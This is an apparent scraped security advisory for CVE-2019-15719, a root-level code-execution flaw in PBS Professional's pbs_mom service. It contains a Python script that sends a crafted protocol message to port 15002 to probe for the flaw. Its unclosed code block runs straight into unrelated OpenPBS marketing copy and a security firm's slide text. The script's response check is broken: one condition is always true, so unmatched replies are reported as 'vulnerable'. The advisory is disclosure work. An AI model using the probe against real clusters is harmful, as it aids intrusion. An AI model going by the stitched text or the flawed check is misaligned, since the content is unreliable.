**Software:** PBS Professional
**Affected Versions:** All versions up to and including 19.2.3
**Vendor:** Altair Engineering, Inc
**CVE Reference:** CVE-2019-15719
**Severity:** CVSS 9.0 [CVSS:3.0/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H]
**Author:** John Fitzpatrick
**Date:** 2019-10-08

## Description

HPCsec have identified a vulnerability in PBS Pro which allows for arbitrary code execution on any node running the pbs\_mom service. This vulnerability can be exploited by anyone in a position to communicate with the pbs\_mom service from an authorized node within the cluster. Exploitation of this issue allows for arbitrary code execution as any other user including as root, even in installations where root is not permitted to submit jobs.

This issue arises as a result of the pbs\_mom service failing to apply a necessary security check before handling instructions sent to it.

By default the pbs\_mom service runs on TCP port 15002. The following code can be run to check whether a mom is vulnerable to this issue:

```
import socket
import sys

if len(sys.argv) < 2:
   print "ERROR: Please specify the address of pbs_mom"
   sys.exit(1)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
   s.connect((sys.argv[1], 15002))
   s.send("+2+1+1+1x+1x+1x2+222+15+1x+0+1x+02+24+1x+01+1x+02+12+1x+0+1x+02+14+1x+0+1x+02+"+
"131+1x+0+1x+02+411+1x+01+1x+02+241+1x+01+1x+02+261+1x+01+1x+02+12+1x+0+1x+02+1"+
"31+1x+0+1x+02+421+1x+01+1x+02+221+1x+1+1x+112+102+251+1x+1+1x+1x2+102+221+1x+0"+
"+1x2+103+3351+1x+01+1x+02+13+1x+0+1x+02+14+1x+0+1x2+102+19+1x+0+1x+02+12+1x+0+"+
"11+02+181+1x+0+210+02+29+6hpcsec+01+1x+02+141+1x+0+11+0+0")

   response = s.recv(64)

   if "Invalid" in response:
      print "Vulnerable = NO"
   elif "Access" in response:
      print "Vulnerable = UNKNOWN (try again from a permitted host, e.g. another mom or the pbs server)"
   elif "Undefined" or "System" in response:
      print "Vulnerable = YES"
   else: print "Vulnerable = UNKNOWN (unhandled response)"

except Exception, e:
   print "ERROR: "+str(e)

## [PBS Professional MoM Authentication Bypass (CVE-2019-15719)](https://www.hpcsec.com/2019/10/08/cve-2019-15719/)

HPCsec have identified a vulnerability in PBS Pro which allows for arbitrary code execution on any node running the pbs\_mom service. This vulnerability can be exploited by anyone in a position to communicate with the pbs\_mom service from an authorized node within the cluster. Exploitation of this issue allows for arbitrary code execution as any other user including as root, even in installations where root is not permitted to submit jobs.

# Industry-leading workload manager and jobscheduler for high-performance computing

[**Downloads**](Download.aspx#download)

## What is OpenPBS®?

OpenPBS software optimizes job scheduling and workload management in high-performance computing (HPC) environments – clusters, clouds, and supercomputers – improving system efficiency and people’s productivity. Built by HPC people for HPC people, OpenPBS is fast, scalable, secure, and resilient, and supports all modern infrastructure, middleware, and applications.

## OpenPBS key features

**Scalability:** supports millions of cores with fast job dispatch and minimal latency; tested beyond 50,000 nodes

**Policy-Driven Scheduling:** meets unique site goals and SLAs by balancing job turnaround time and utilization with optimal job placement

**Resiliency:** includes automatic fail-over architecture with no single point of failure – jobs are never lost, and jobs continue to run despite failures

**Flexible Plugin Framework:** simplifies administration with enhanced visibility and extensibility; customize implementations to meet complex requirements

**Health Checks:** monitors and automatically mitigates faults with a comprehensive health check framework

**Voted #1 HPC Software** by HPCWire readers and proven for over 20 years at thousands of sites around the globe in both the private sector and public sector

## About PBS

We released Altair® PBS Professional® under an open source license… why?

More than 25 years ago, Bill Nitzberg was just starting his career in HPC at NASA, where, along with a great team, he developed the original PBS software. Today, Altair PBS Professional is among the most-used technologies for HPC job scheduling.

But scheduling is hard — every site has unique processes, unique goals, and unique business requirements. Too often effort is duplicated across public and private sectors as functionality is replicated in open source and closed source products. So in 2016 Altair made a big investment toward uniting the whole HPC community to accelerate the state of the art (and the state of actual production operations) for HPC scheduling. We released PBS Professional under an open-source license, opening the core of the software to the community.

PBS Professional continues to be available as a hardened, commercial version for enterprise customers, but alongside that offering we are committed to being open and community oriented. We are focused on longevity – creating a viable, sustainable community to focus on job scheduling software that can truly bridge the gap in the HPC world. We continue to contribute to the OpenPBS code base with updates from the core PBS Professional product and adopt community improvements from OpenPBS as well.

Obviously, we cannot do this alone! Please join us as part of the OpenPBS community.

## Community and ways to participate

OpenPBS is a community effort and there are a variety of ways to engage, from helping answer questions to benchmarking to developing new capabilities and tests. We value being aggressively open and inclusive, but also aggressively respectful and professional.

The best place to start is by joining the [OpenPBS Community](https://community.openpbs.org/).

Please consider letting the community know about your use of OpenPBS. Your organization name and system information will be added to the public list of OpenPBS users at [the OpenPBS Registry Page](https://pbspro.atlassian.net/wiki/spaces/PBSPro/pages/322535436/PBS%2BPro%2BRegistry).

Slide 1![](//www.hpcsec.com/wp-content/uploads/2021/12/shield-black-bg.png)Specialists in HPC security

For nearly a decade HPCsec have been securing some of the worlds most powerful supercomputers and the technologies on which they rely.

Almost every current supercomputer is more secure as a result of our work.

Slide 3![](//www.hpcsec.com/wp-content/uploads/2021/12/cpu-black-bg.png)World Leading HPC Vulnerability Research and Threat Hunting

We have reported multiple critical security vulnerabilities to vendors such as IBM, Cray, SGI, DDN, ThinkparQ, Altair, Adaptive…

We also hold the worlds most advanced HPC threat intelligence.

Slide 2![](//www.hpcsec.com/wp-content/uploads/2021/12/dollar-black-bg.png)Incorporating Security into your Procurement

We’ve enabled a significant uplift in the security posture of HPC systems for our clients by embedding security requirements from the outset

For a decade HPCsec have been securing some of the worlds most powerful supercomputers and in the process have uplifted the security of almost every supercomputer that exists today. We are the worlds only dedicated HPC security specialist.

> Pretty much every HPC system we have seen ships with critical security flaws
